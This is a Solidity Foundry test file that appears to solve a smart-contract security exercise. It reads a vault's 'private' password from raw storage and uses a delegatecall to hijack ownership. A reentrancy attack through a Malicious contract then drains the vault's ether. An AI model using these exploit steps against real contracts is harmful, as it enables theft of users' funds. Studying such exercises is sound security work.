// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";
import "../src/Malicious.sol"; 

contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;
    bytes32 private nownPassword = bytes32("0x1234");

    address owner = address (1);
    address newOwner = address (2);
    address user1 = address (3);
    address user2 = address (4);
    Malicious public malicious;

    function setUp() public {
        vm.deal(owner, 1 ether);
        vm.deal(user1,10 ether);
        vm.deal(user2,10 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(nownPassword);
        vault = new Vault(address(logic));
        vm.stopPrank();

        vm.prank(user1);
        vault.deposite{value: 7 ether}();

        uint256 balance = getDeposit(user1);
        assertEq(balance, 7 ether, "balance failed");
        assertEq(address(vault).balance, 7 ether, "balance failed");

        vm.startPrank(owner);
        malicious = new Malicious(address(vault));
        vm.stopPrank();

        vm.deal(address(malicious), 1 ether);
        vm.prank(address(malicious));
        vault.deposite{value: 1 ether}();

        uint256 maliciousDeposit = getDeposit(address(malicious));
        assertEq(maliciousDeposit, 1 ether, "Malicious deposit failed");

        assertEq(address(vault).balance, 8 ether, "Vault balance incorrect after Malicious deposit");
    }

    function getDeposit(address user) internal returns (uint256) {
        bytes32 slot = keccak256(abi.encode(user, uint256(2)));
        
        bytes32 value = vm.load(address(vault), slot);
        
        return uint256(value);
    }

    function getPassword() internal returns(bytes32,address){
        return (vm.load(address(vault), bytes32(uint256(1))),address(uint160(uint256(vm.load(address(vault), bytes32(uint256(1)))))));
    }

    function testExtractPassword() public {

        (,address logicAddress)  = getPassword();
        bytes32 extractedPassword = vm.load(address(logicAddress), bytes32(uint256(1)));

        assertEq(extractedPassword, nownPassword, "Password extraction failed");
    }

    function testEditOwner() public {
        (bytes32 extractedPassword,address logicAddress)  = getPassword();

        bytes memory payload = abi.encodeWithSignature(
            "changeOwner(bytes32,address)",
            extractedPassword,
            newOwner
        );

        (bool success, ) = address(vault).call(payload);
        require(success, "Delegatecall to changeOwner failed");

        address updatedOwner = vault.owner();

        assertEq(updatedOwner, newOwner, "Owner was not updated correctly");

    }

    function testReentrantAttack() public {
        (bytes32 extractedPassword,address logicAddress)  = getPassword();

        bytes memory payload = abi.encodeWithSignature(
            "changeOwner(bytes32,address)",
            extractedPassword,
            newOwner
        );

        (bool success, ) = address(vault).call(payload);
        require(success, "Delegatecall to changeOwner failed");

        address updatedOwner = vault.owner();
        assertEq(updatedOwner, newOwner, "Owner was not updated correctly");

        vm.prank(newOwner);
        vault.openWithdraw();
        assertEq(vault.canWithdraw(), true, "Owner was not updated correctly");

        vm.prank(owner);
        malicious.setMaxReentrancy(7);

        vm.prank(address(malicious));
        malicious.attack();


        assertEq(address(vault).balance, 0 ether, "Vault balance after attack incorrect");
        assertEq(address(malicious).balance, 8 ether, "Malicious balance incorrect");

        uint256 maliciousDeposit = getDeposit(address(malicious));
        assertEq(maliciousDeposit, 0 ether, "Malicious deposit not reset");
    }
}